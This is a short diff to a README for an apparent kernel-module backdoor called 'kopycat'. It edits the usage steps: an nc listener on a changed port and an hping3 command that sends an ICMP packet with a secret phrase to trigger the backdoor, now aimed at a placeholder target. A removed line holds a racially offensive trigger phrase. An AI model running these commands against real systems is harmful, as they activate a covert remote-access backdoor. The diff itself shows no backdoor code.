@@ -14,12 +14,12 @@ $ cat /proc/modules | grep kopycat
 
 Launch `nc` listener:
 ~~~
-$ nc -l 6666
+$ nc -l 8087
 ~~~
 
 Trigger the backdoor by sending ICMP packet with secret phrase:
 ~~~
-$ sudo hping3 -c 1 -j -1 -e black-wives-are-fatter 127.0.0.1
+$ sudo hping3 -c 1 -j -1 -e black-magic-test <target>
 ~~~
 
 # Author
